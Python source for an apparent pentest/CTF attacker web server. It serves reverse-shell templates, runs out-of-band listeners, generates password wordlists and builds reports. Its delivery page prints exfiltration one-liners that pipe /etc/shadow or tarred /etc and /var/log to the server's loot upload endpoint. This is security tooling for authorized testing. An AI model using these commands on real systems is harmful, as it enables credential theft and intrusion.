        file_rows = '<tr><td colspan="3" style="text-align:center;color:var(--text2);padding:20px">Nessun file in static/</td></tr>'

    lport_info = (
        f'LHOST: <code>{html.escape(_lhost or "?")}</code> &nbsp;|&nbsp; '
        f'LPORT: <input type="number" id="lport-val" value="{_lport}" min="1" max="65535" '
        f'style="width:70px;background:var(--surface);color:var(--accent);border:1px solid var(--border);'
        f'border-radius:4px;padding:2px 6px;font-family:monospace;font-size:13px;text-align:center">'
        f' <button onclick="setLport()" style="background:var(--surface);color:var(--accent);'
        f'border:1px solid var(--border);border-radius:4px;padding:3px 10px;font-size:11px;cursor:pointer">Applica</button>'
        f' <span id="lport-msg" style="font-size:11px;margin-left:4px"></span>'
    )

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Delivery</div>
<div class="page-title">Quick Delivery</div>
<div class="page-sub">{lport_info}</div>
<h3 style="margin:24px 0 12px;color:var(--text)">Endpoint dinamici</h3>
{ep_cards}
<h3 style="margin:24px 0 12px;color:var(--text)">File statici ({len(files)})</h3>
<div class="table-scroll">
<table class="log-table" style="font-size:13px">
<thead><tr><th>File</th><th style="width:80px">Size</th><th>Comando</th></tr></thead>
<tbody>{file_rows}</tbody>
</table>
</div>
<h3 style="margin:24px 0 12px;color:var(--text)">Upload dalla vulnbox (loot)</h3>
<div class="delivery-card">
<div class="dc-header"><span class="dc-endpoint">/upload</span><span class="dc-title">Upload File</span></div>
<div class="dc-desc">Carica file dalla vulnbox verso la cartella <code>loot/</code> del server. I file vengono salvati con timestamp e IP sorgente.</div>
<div class="dc-cmd"><code>{html.escape(f'curl -F "file=@/path/to/file" {base}/upload')}</code></div>
<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload file singolo con multipart form</div>
<div class="dc-cmd"><code>{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt')}</code></div>
<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload via pipe (contenuto come body)</div>
<div class="dc-cmd"><code>{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db')}</code></div>
<div style="color:var(--text2);font-size:12px;margin:4px 0">Upload con PUT</div>
<div class="dc-cmd"><code>{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz')}</code></div>
<div style="color:var(--text2);font-size:12px;margin:4px 0">Esfiltra cartelle intere compressi via tar</div>
</div>
<div style="margin-top:8px;font-size:12px;color:var(--text2)">I file sono consultabili nella sezione <a href="/loot/">Loot</a>.</div>
</div>
<script>
function setLport(){{
  var v=document.getElementById('lport-val').value;
  var msg=document.getElementById('lport-msg');
  fetch('/api/lport',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{port:parseInt(v)}})}}
  ).then(function(r){{return r.json();}}).then(function(d){{
    if(d.ok){{msg.style.color='var(--green)';msg.textContent='Aggiornato a '+d.lport;setTimeout(function(){{location.reload();}},800);}}
    else{{msg.style.color='var(--red)';msg.textContent=d.error||'Errore';}}
  }}).catch(function(e){{msg.style.color='var(--red)';msg.textContent='Errore: '+e.message;}});
}}
document.getElementById('lport-val').addEventListener('keydown',function(e){{if(e.key==='Enter')setLport();}});
</script>"""
    return _base_html("Delivery", body, active="delivery")


def _page_catch() -> str:
    body = """\
<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Catch</div>
<div class="page-title">OOB Listeners</div>
<div class="page-sub" id="catch-sub">Listeners per conferma blind e cattura dati</div>

<div id="catch-status" style="margin:16px 0;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px"></div>

<div style="margin:12px 0;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
  <select id="catch-filter" style="background:var(--surface);border:1px solid var(--border);color:var(--text);padding:4px 10px;border-radius:4px;font-size:13px">
    <option value="">Tutti</option>
    <option value="tcp">TCP</option>
    <option value="dns">DNS</option>
    <option value="ftp">FTP</option>
    <option value="smb">SMB</option>
  </select>
  <label style="display:flex;align-items:center;gap:6px;color:var(--text2);font-size:13px;cursor:pointer">
    <input type="checkbox" id="catch-auto" checked> Auto-scroll
  </label>
  <button onclick="document.getElementById('catch-body').innerHTML='';window._catchReset()"
    style="background:var(--surface);border:1px solid var(--border);color:var(--text2);
    padding:4px 12px;border-radius:4px;cursor:pointer;font-size:12px">Clear</button>
  <span style="color:var(--text2);font-size:11px;margin-left:auto" id="catch-status-txt">connecting...</span>
</div>
<div class="log-table-wrap">
<table class="log-table">
<thead><tr><th style="width:70px">Ora</th><th style="width:50px">Tipo</th><th style="width:130px">Client</th><th>Evento</th></tr></thead>
<tbody id="catch-body"></tbody>
</table>
</div>
</div>
<script>
(function(){
  var offset=0;
  var tbody=document.getElementById('catch-body');
  var statusTxt=document.getElementById('catch-status-txt');
  var autoChk=document.getElementById('catch-auto');
  var filterEl=document.getElementById('catch-filter');
  var statusDiv=document.getElementById('catch-status');

  var colors={tcp:'#58a6ff',dns:'#f0883e',ftp:'#a371f7',smb:'#3fb950'};

  window._catchReset=function(){offset=0;};

  function pollStatus(){
    fetch('/api/catch/status').then(function(r){return r.json();}).then(function(data){
      var h='';
      ['tcp','dns','ftp','smb'].forEach(function(t){
        var s=data[t];
        var active=s&&s.active;
        var dot=active?'<span style="color:var(--green)">●</span>':'<span style="color:var(--text2)">○</span>';
        var info=active?'porta '+s.port+' — '+s.events+' eventi':'inattivo';
        h+='<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:10px 14px">'
          +dot+' <strong style="color:'+colors[t]+'">'+t.toUpperCase()+'</strong>'
          +'<div style="color:var(--text2);font-size:12px;margin-top:3px">'+info+'</div></div>';
      });
      statusDiv.innerHTML=h;
    }).catch(function(){});
  }

  function pollLogs(){
    var url='/api/catch/logs?since='+offset;
    var f=filterEl.value;
    if(f)url+='&type='+f;
    fetch(url).then(function(r){return r.json();}).then(function(data){
      statusTxt.textContent='live';
      statusTxt.style.color='var(--green)';
      if(data.entries&&data.entries.length){
        data.entries.forEach(function(e){
          var tr=document.createElement('tr');
          var c=colors[e.type]||'var(--text2)';
          tr.innerHTML='<td class="log-ts">'+esc(e.ts)+'</td>'
            +'<td style="color:'+c+';font-weight:600;font-size:12px">'+esc((e.type||'').toUpperCase())+'</td>'
            +'<td class="log-client">'+esc(e.client)+'</td>'
            +'<td class="log-msg">'+esc(e.msg)+'</td>';
          tbody.appendChild(tr);
        });
        offset=data.total;
        if(autoChk.checked){
          var wrap=document.querySelector('.log-table-wrap');
          wrap.scrollTop=wrap.scrollHeight;
        }
      }
    }).catch(function(){
      statusTxt.textContent='disconnected';
      statusTxt.style.color='var(--red)';
    });
  }

  function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
  pollStatus();pollLogs();
  setInterval(function(){pollStatus();pollLogs();},2000);
})();
</script>"""
    return _base_html("Catch", body, active="catch")


def _page_logs() -> str:
    body = """\
<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Logs</div>
<div class="page-title">Server Logs</div>
<div class="page-sub" id="log-count">0 entries</div>
<div style="margin:12px 0;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
  <label style="display:flex;align-items:center;gap:6px;color:var(--text2);font-size:13px;cursor:pointer">
    <input type="checkbox" id="log-auto" checked> Auto-scroll
  </label>
  <button onclick="document.getElementById('log-body').innerHTML='';window._logReset()"
    style="background:var(--surface);border:1px solid var(--border);color:var(--text2);
    padding:4px 12px;border-radius:4px;cursor:pointer;font-size:12px">Clear</button>
  <span style="color:var(--text2);font-size:11px;margin-left:auto" id="log-status">connecting...</span>
</div>
<div class="log-table-wrap">
<table class="log-table">
<thead><tr><th style="width:70px">Ora</th><th style="width:130px">Client</th><th>Request</th></tr></thead>
<tbody id="log-body"></tbody>
</table>
</div>
</div>
<script>
(function(){
  var offset=0;
  var tbody=document.getElementById('log-body');
  var countEl=document.getElementById('log-count');
  var statusEl=document.getElementById('log-status');
  var autoChk=document.getElementById('log-auto');
  window._logReset=function(){fetch('/api/logs?since=0').then(function(r){return r.json();}).then(function(d){offset=d.total;});};

  function poll(){
    fetch('/api/logs?since='+offset)
    .then(function(r){return r.json();})
    .then(function(data){
      statusEl.textContent='live';
      statusEl.style.color='var(--green)';
      if(data.entries&&data.entries.length){
        data.entries.forEach(function(e){
          var tr=document.createElement('tr');
          tr.innerHTML='<td class="log-ts">'+esc(e.ts)+'</td>'+
            '<td class="log-client">'+esc(e.client)+'</td>'+
            '<td class="log-msg">'+esc(e.msg)+'</td>';
          tbody.appendChild(tr);
        });
        offset=data.total;
        countEl.textContent=data.total+' entr'+(data.total===1?'y':'ies');
        if(autoChk.checked){
          var wrap=document.querySelector('.log-table-wrap');
          wrap.scrollTop=wrap.scrollHeight;
        }
      }
    })
    .catch(function(){
      statusEl.textContent='disconnected';
      statusEl.style.color='var(--red)';
    });
  }
  function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
  poll();
  setInterval(poll,2000);
})();
</script>"""
    return _base_html("Logs", body, active="logs")


def _page_search_results(query: str) -> str:
    results = _search_all(query)
    eq = html.escape(query)
    cat_labels = {"notes": "Notes", "vuln": "Vuln", "tools": "Tools"}

    def _hl_html(text: str) -> str:
        escaped = html.escape(text)
        import re as _re
        return _re.sub(
            f"({_re.escape(eq)})",
            r"<mark>\1</mark>",
            escaped,
            flags=_re.IGNORECASE,
        )

    cards = ""
    for r in results:
        tag_cls = r["section"]
        tag_label = cat_labels.get(r["section"], r["section"])
        href = f"{r['href']}?q={html.escape(query)}"
        cards += f"""<a href="{href}" style="text-decoration:none"><div class="search-page-item">
<div class="sp-header"><span class="sp-tag {tag_cls}">{tag_label}</span>
<span class="sp-name">{_hl_html(r['name'])}</span></div>
<div class="sp-ctx">{_hl_html(r['context'])}</div>
</div></a>\n"""

    if not results:
        cards = f'<p style="color:var(--text2);text-align:center;padding:40px 0">Nessun risultato per "{eq}"</p>'

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Ricerca</div>
<div class="page-title">Ricerca: {eq}</div>
<div class="page-sub">{len(results)} risultat{'o' if len(results) == 1 else 'i'}</div>
{cards}
</div>"""
    return _base_html(f"Ricerca: {query}", body)


def get_web_url() -> str | None:
    if _server is None:
        return None
    port = _server.server_address[1]
    return f"http://{_lhost}:{port}"


class SlRequestHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        import time as _time
        msg = fmt % args
        if "/api/logs" in msg:
            return
        client = self.client_address[0]
        ts = _time.strftime("%H:%M:%S")
        entry = {"ts": ts, "client": client, "msg": msg}
        with _log_lock:
            _log_entries.append(entry)
            if len(_log_entries) > _LOG_MAX:
                del _log_entries[: len(_log_entries) - _LOG_MAX]

    def _send_text(self, body: str, content_type: str = "text/plain") -> None:
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _send_html(self, body: str) -> None:
        self._send_text(body, content_type="text/html; charset=utf-8")

    def _payload_vars(self) -> dict[str, str | int]:
        return {"lhost": _lhost, "lport": _lport}

    def do_GET(self) -> None:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        qs = parse_qs(parsed.query)
        pv = self._payload_vars()

        ua = self.headers.get("User-Agent", "")
        is_curl = "curl" in ua.lower()

        if path == "/":
            if is_curl:
                self._serve_index(pv)
            else:
                self._send_html(_page_home())
        elif path in ("/upgrade", "/upgrade_revshell"):
            self._send_text(UPGRADE_TEMPLATE.format(**pv))
        elif path == "/upgrade2":
            self._send_text(UPGRADE2_TEMPLATE)
        elif path == "/rev":
            self._send_text(REVSHELL_BASH.format(**pv))
        elif path == "/sh":
            self._send_text(REVSHELL_PYTHON.format(**pv))
        elif path == "/linseal":
            self._serve_linseal(qs)
        elif path == "/slrecon":
            self._serve_slrecon(qs)
        elif path == "/api/search":
            q = qs.get("q", [""])[0]
            results = _search_all(q)
            self._send_json({"results": results})
        elif path == "/search":
            q = qs.get("q", [""])[0]
            self._send_html(_page_search_results(q))
        elif path == "/logs":
            self._send_html(_page_logs())
        elif path == "/api/logs":
            since = int(qs.get("since", ["0"])[0])
            with _log_lock:
                entries = _log_entries[since:]
                total = len(_log_entries)
            self._send_json({"entries": entries, "total": total})
        elif path == "/catch":
            self._send_html(_page_catch())
        elif path == "/api/catch/logs":
            stype = qs.get("type", [None])[0]
            since = int(qs.get("since", ["0"])[0])
            logs = catch_logs(stype)
            entries = logs[since:]
            self._send_json({"entries": entries, "total": len(logs)})
        elif path == "/api/catch/status":
            info = {}
            for st in _CATCH_TYPES:
                if st in _catch_servers:
                    si = _catch_servers[st]
                    info[st] = {"active": True, "port": si["port"],
                                "events": len(si["logs"])}
                else:
                    info[st] = {"active": False}
            self._send_json(info)
        elif path == "/notes":
            self._send_html(_page_list("Notes", "notes", _discover_notes()))
        elif path.startswith("/notes/"):
            self._serve_md_page("notes", "Notes", NOTES_ROOT, path[7:])
        elif path == "/vuln":
            self._send_html(_page_list("Vuln", "vuln", _discover_vulns()))
        elif path.startswith("/vuln/"):
            self._serve_md_page("vuln", "Vuln", VULN_ROOT, path[6:])
        elif path == "/tools":
            self._send_html(_page_list("Tools", "tools", _discover_tools()))
        elif path.startswith("/tools/"):
            self._serve_tool_page(path[7:])
        elif path == "/static":
            self._send_html(_page_static_list())
        elif path.startswith("/static/edit/"):
            name = path[13:]
            if ".." in name or "/" in name:
                self.send_error(403)
            else:
                self._send_html(_page_static_edit(name))
        elif path.startswith("/static/"):
            name = path[8:]
            if ".." in name or "/" in name:
                self.send_error(403)
            else:
                fpath = STATIC_ROOT / name
                if fpath.is_file():
                    self._serve_static(name)
                else:
                    self._send_html(_page_static_list())
        elif path == "/delivery":
            ua = self.headers.get("User-Agent", "")
            if "curl" in ua.lower():
                self._serve_index(pv)
            else:
                self._send_html(_page_delivery())
        elif path == "/loot":
            self._send_html(_page_loot())
        elif path == "/pet":
            self._send_html(_page_pet())
        elif path in {"/pet/minigame", "/minigame"}:
            self._send_html(_page_minigame())
        elif path == "/burp":
            self._send_html(_page_burp())
        elif path == "/report":
            self._send_html(_page_report())
        elif path.startswith("/report/wizard/"):
            slug = path[15:]
            if ".." in slug or "/" in slug:
                self.send_error(403)
            else:
                self._send_html(_page_report_wizard(slug))
        elif path == "/api/report/data":
            self._api_report_data(qs.get("slug", [""])[0])
        elif path == "/api/report/msf-search":
            self._api_report_msf_search(qs.get("q", [""])[0])
        elif path.startswith("/report/img/"):
            rest = path[12:]
            parts = rest.split("/", 1)
            if len(parts) != 2 or ".." in rest:
                self.send_error(403)
            else:
                self._serve_report_image(parts[0], parts[1])
        elif path.startswith("/report-assets/"):
            self._serve_report_asset_file(path[15:])
        elif path.startswith("/report/view/"):
            slug = path[13:]
            if ".." in slug or "/" in slug:
                self.send_error(403)
            else:
                self._send_html(_page_report_view(slug))
        elif path.startswith("/report/raw/"):
            self._serve_report_raw(path[12:])
        elif path.startswith("/report/pdf/"):
            self._serve_report_pdf(path[12:])
        elif path.startswith("/loot/view/"):
            name = path[11:]
            if ".." in name or "/" in name:
                self.send_error(403)
            else:
                self._send_html(_page_loot_view(name))
        elif path.startswith("/loot/raw/"):
            name = path[10:]
            self._serve_loot_raw(name)
        else:
            self._serve_static(path)

    def _serve_md_page(self, section: str, label: str, root: Path, name: str) -> None:
        if ".." in name or "/" in name:
            self.send_error(403)
            return
        md_file = root / f"{name}.md"
        if not md_file.is_file():
            self.send_error(404, f"Non trovato: {name}")
            return
        md_text = md_file.read_text(encoding="utf-8", errors="replace")
        self._send_html(_page_md(section, label, name, md_text))

    def _serve_tool_page(self, name: str) -> None:
        if ".." in name or "/" in name:
            self.send_error(403)
            return
        tool_dir = TOOL_ROOT / name
        if not tool_dir.is_dir():
            self.send_error(404, f"Tool non trovato: {name}")
            return
        help_f = tool_dir / "help.md"
        if not help_f.exists():
            help_f = tool_dir / "help.txt"
        if not help_f.exists():
            self.send_error(404, f"Nessun help per: {name}")
            return
        md_text = help_f.read_text(encoding="utf-8", errors="replace")
        self._send_html(_page_md("tools", "Tools", name, md_text))

    def _serve_index(self, pv: dict) -> None:
        files = []
        if STATIC_ROOT.is_dir():
            for f in sorted(STATIC_ROOT.iterdir()):
                if f.is_file() and not f.name.startswith("."):
                    size = f.stat().st_size
                    if size > 1_048_576:
                        label = f"{size / 1_048_576:.1f} MB"
                    elif size > 1024:
                        label = f"{size / 1024:.1f} KB"
                    else:
                        label = f"{size} B"
                    base = f"http://{_lhost}:{self.server.server_address[1]}"
                    files.append(
                        f'  <li><a href="/{f.name}"><code>{f.name}</code></a> ({label})'
                        f" — <code>curl {base}/{f.name} -o {f.name}</code></li>"
                    )
        file_list = "\n".join(files) if files else "  <li><em>Nessun file in static/</em></li>"
        base = f"http://{_lhost}:{self.server.server_address[1]}"
        html = INDEX_TEMPLATE.format(base=base, file_list=file_list, **pv)
        self._send_text(html, content_type="text/html")

    def _serve_static(self, path: str) -> None:
        name = path.lstrip("/")
        if ".." in name or name.startswith("/"):
            self.send_error(403)
            return
        target = STATIC_ROOT / name
        if not target.is_file():
            self.send_error(404, f"File non trovato: {name}")
            return
        try:
            data = target.read_bytes()
        except OSError:
            self.send_error(500)
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{target.name}"')
        self.end_headers()
        self.wfile.write(data)

    def _send_json(self, obj: dict, status: int = 200) -> None:
        data = json.dumps(obj).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length)

    def _safe_static_name(self, name: str) -> Path | None:
        if not name or ".." in name or "/" in name or "\\" in name or name.startswith("."):
            return None
        return STATIC_ROOT / name

    def do_POST(self) -> None:
        path = self.path.split("?")[0].rstrip("/")

        if path == "/api/static/save":
            self._api_save()
        elif path == "/api/static/delete":
            self._api_delete()
        elif path == "/api/static/upload":
            self._api_upload()
        elif path == "/upload" or path.startswith("/upload/"):
            self._api_loot_upload(path)
        elif path == "/api/loot/delete":
            self._api_loot_delete()
        elif path == "/api/loot/clear":
            self._api_loot_clear()
        elif path == "/api/lport":
            self._api_lport()
        elif path == "/api/burp/generate":
            self._api_burp_generate()
        elif path == "/api/burp/estimate":
            self._api_burp_estimate()
        elif path == "/api/report/new":
            self._api_report_new()
        elif path == "/api/report/build":
            self._api_report_build()
        elif path == "/api/report/delete":
            self._api_report_delete()
        elif path == "/api/report/meta":
            self._api_report_meta()
        elif path == "/api/report/finding":
            self._api_report_finding()
        elif path == "/api/report/finding/delete":
            self._api_report_finding_delete()
        elif path == "/api/report/section":
            self._api_report_section()
        elif path == "/api/report/asset":
            self._api_report_asset()
        elif path == "/api/report/preview":
            self._api_report_preview()
        elif path == "/api/report/raw":
            self._api_report_raw()
        else:
            self.send_error(404)

    def do_PUT(self) -> None:
        path = self.path.split("?")[0].rstrip("/")
        if path.startswith("/upload/"):
            self._api_loot_upload(path)
        else:
            self.send_error(404)

    def _api_save(self) -> None:
        try:
            body = json.loads(self._read_body())
            name = body.get("name", "").strip()
            content = body.get("content", "")
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, 400)
            return
        target = self._safe_static_name(name)
        if target is None:
            self._send_json({"ok": False, "error": "Nome file non valido"}, 400)
            return
        STATIC_ROOT.mkdir(parents=True, exist_ok=True)
        try:
            target.write_text(content, encoding="utf-8")
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True, "name": name})

    def _api_delete(self) -> None:
        try:
            body = json.loads(self._read_body())
            name = body.get("name", "").strip()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, 400)
            return
        target = self._safe_static_name(name)
        if target is None or not target.is_file():
            self._send_json({"ok": False, "error": "File non trovato"}, 404)
            return
        try:
            target.unlink()
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True})

    def _api_upload(self) -> None:
        content_type = self.headers.get("Content-Type", "")
        if "multipart/form-data" not in content_type:
            self._send_json({"ok": False, "error": "Richiesto multipart/form-data"}, 400)
            return
        import cgi
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={"REQUEST_METHOD": "POST",
                     "CONTENT_TYPE": content_type},
        )
        file_item = form["file"] if "file" in form else None
        if file_item is None or not file_item.filename:
            self._send_json({"ok": False, "error": "Nessun file ricevuto"}, 400)
            return
        name = Path(file_item.filename).name
        target = self._safe_static_name(name)
        if target is None:
            self._send_json({"ok": False, "error": "Nome file non valido"}, 400)
            return
        STATIC_ROOT.mkdir(parents=True, exist_ok=True)
        try:
            target.write_bytes(file_item.file.read())
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True, "name": name})

    def _api_loot_upload(self, path: str) -> None:
        client_ip = self.client_address[0]
        content_type = self.headers.get("Content-Type", "")

        filename_from_path = ""
        if path.startswith("/upload/"):
            filename_from_path = path[8:]
            if ".." in filename_from_path or "/" in filename_from_path:
                self._send_json({"ok": False, "error": "Nome file non valido"}, 400)
                return

        if "multipart/form-data" in content_type:
            import cgi
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={"REQUEST_METHOD": "POST",
                         "CONTENT_TYPE": content_type},
            )
            file_item = form["file"] if "file" in form else None
            if file_item is None or not file_item.filename:
                self._send_json({"ok": False, "error": "Nessun file ricevuto"}, 400)
                return
            data = file_item.file.read()
            filename = filename_from_path or Path(file_item.filename).name
        else:
            data = self._read_body()
            if not data:
                self._send_json({"ok": False, "error": "Body vuoto"}, 400)
                return
            filename = filename_from_path or "upload"

        saved = _save_loot_file(data, filename, client_ip)
        size = len(data)
        if size > 1_048_576:
            label = f"{size / 1_048_576:.1f} MB"
        elif size > 1024:
            label = f"{size / 1024:.1f} KB"
        else:
            label = f"{size} B"
        self._send_json({"ok": True, "name": saved, "size": label})

    def _api_loot_delete(self) -> None:
        try:
            body = json.loads(self._read_body())
            name = body.get("name", "").strip()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, 400)
            return
        if not name or ".." in name or "/" in name or "\\" in name:
            self._send_json({"ok": False, "error": "Nome non valido"}, 400)
            return
        target = LOOT_ROOT / name
        if not target.is_file():
            self._send_json({"ok": False, "error": "File non trovato"}, 404)
            return
        try:
            target.unlink()
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, 500)
            return
        self._send_json({"ok": True})

    def _api_loot_clear(self) -> None:
        if not LOOT_ROOT.is_dir():
            self._send_json({"ok": True, "deleted": 0})
            return
        count = 0
        for f in LOOT_ROOT.iterdir():
            if f.is_file() and not f.name.startswith("."):
                f.unlink()
                count += 1
        self._send_json({"ok": True, "deleted": count})

    def _api_lport(self) -> None:
        try:
            body = json.loads(self._read_body())
            port = int(body.get("port", 0))
        except (json.JSONDecodeError, ValueError, TypeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        msg = set_lport(port)
        if "non valida" in msg:
            self._send_json({"ok": False, "error": msg}, status=400)
        else:
            self._send_json({"ok": True, "lport": _lport})

    def _api_burp_generate(self) -> None:
        try:
            body = json.loads(self._read_body())
            profile_data = body.get("profile", {})
            level = body.get("level", "medium")
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        if level not in ("fast", "medium", "full"):
            level = "medium"
        try:
            from lib.burp import generate_from_dict
            passwords = generate_from_dict(profile_data, level)
            self._send_json({"ok": True, "passwords": passwords, "count": len(passwords)})
        except Exception as e:
            self._send_json({"ok": False, "error": str(e)}, status=500)

    def _api_burp_estimate(self) -> None:
        try:
            body = json.loads(self._read_body())
            profile_data = body.get("profile", {})
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        try:
            from lib.burp import estimate_counts
            counts = estimate_counts(profile_data)
            self._send_json({"ok": True, "counts": counts})
        except Exception as e:
            self._send_json({"ok": False, "error": str(e)}, status=500)

    # ------------------------------------------------------------------
    # Report API + file serving
    # ------------------------------------------------------------------

    def _api_report_new(self) -> None:
        try:
            body = json.loads(self._read_body())
            client = str(body.get("client", "")).strip()
            rtype = str(body.get("rtype", "")).strip() or "Penetration Test Interno"
            box = str(body.get("box", "black")).strip()
            domain = str(body.get("domain", "")).strip()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        if not client:
            self._send_json({"ok": False, "error": "Nome cliente mancante"}, status=400)
            return
        try:
            from lib.report import create_report
            out = create_report(client, rtype, box=box, domain=domain)
            self._send_json({"ok": True, "slug": out.parent.name, "path": str(out)})
        except (ValueError, FileExistsError, FileNotFoundError) as e:
            self._send_json({"ok": False, "error": str(e)}, status=400)
        except Exception as e:
            self._send_json({"ok": False, "error": str(e)}, status=500)

    def _api_report_build(self) -> None:
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import build_report
        ok, msg = build_report(slug)
        if ok:
            self._send_json({"ok": True, "pdf": msg})
        else:
            self._send_json({"ok": False, "error": msg}, status=400)

    def _api_report_delete(self) -> None:
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        try:
            shutil.rmtree(Path(rep["md"]).parent)
            self._send_json({"ok": True})
        except OSError as e:
            self._send_json({"ok": False, "error": str(e)}, status=500)

    def _api_report_data(self, slug: str) -> None:
        from lib.report import find_report, load_meta, get_sections
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        meta = load_meta(rep["slug"])
        if meta is None:
            self._send_json({"ok": False, "error": "meta.json mancante — report in vecchio formato"}, status=400)
            return
        md_text = Path(rep["md"]).read_text(encoding="utf-8", errors="replace")
        sections = {k: re.sub(r"<!--.*?-->", "", v, flags=re.S).strip()
                    for k, v in get_sections(md_text).items()}
        self._send_json({"ok": True, "slug": rep["slug"], "meta": meta,
                         "sections": sections, "raw": md_text,
                         "pdf": bool(rep["pdf"])})

    def _api_report_meta(self) -> None:
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            meta = body.get("meta", {})
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report, load_meta, save_meta, sync_report
        rep = find_report(slug)
        if rep is None or not isinstance(meta, dict):
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        old = load_meta(rep["slug"]) or {}
        for key in ("client", "rtype", "box", "domain", "date_start", "date_end",
                    "time_start", "time_end", "scope", "style"):
            if key in meta:
                old[key] = meta[key]
        if not str(old.get("client", "")).strip():
            self._send_json({"ok": False, "error": "Nome cliente obbligatorio"}, status=400)
            return
        save_meta(rep["slug"], old)
        ok, msg = sync_report(rep["slug"])
        self._send_json({"ok": ok, "error": None if ok else msg})

    def _api_report_finding(self) -> None:
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            index = body.get("index")
            finding = body.get("finding", {})
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        if not isinstance(finding, dict) or not str(finding.get("title", "")).strip():
            self._send_json({"ok": False, "error": "Titolo del finding obbligatorio"}, status=400)
            return
        from lib.report import find_report, add_finding
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        idx = int(index) if isinstance(index, int) else None
        ok, msg = add_finding(rep["slug"], finding, idx)
        self._send_json({"ok": ok, "message": msg, "error": None if ok else msg},
                        status=200 if ok else 400)

    def _api_report_finding_delete(self) -> None:
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            index = int(body.get("index", -1))
        except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report, delete_finding
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        ok, msg = delete_finding(rep["slug"], index)
        self._send_json({"ok": ok, "error": None if ok else msg}, status=200 if ok else 400)

    def _api_report_section(self) -> None:
        try:
            body = json.loads(self._read_body())
            slug = str(body.get("slug", "")).strip()
            section = str(body.get("section", "")).strip()
            content = str(body.get("content", ""))
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json({"ok": False, "error": "JSON non valido"}, status=400)
            return
        from lib.report import find_report, update_section
        rep = find_report(slug)
        if rep is None:
            self._send_json({"ok": False, "error": "Report non trovato"}, status=404)
            return
        ok = update_section(rep["slug"], section, content)
        self._send_json({"ok": ok, "error": None if ok else "Sezione non trovata nel .md"},
                        status=200 if ok else 400)

    def _api_report_msf_search(self, q: str) -> None:
        """Ricerca CVE/moduli nel db LOCALE di Metasploit (mai online)."""
        from lib.report import msf_search
        try:
            res = msf_search(q, limit=30)
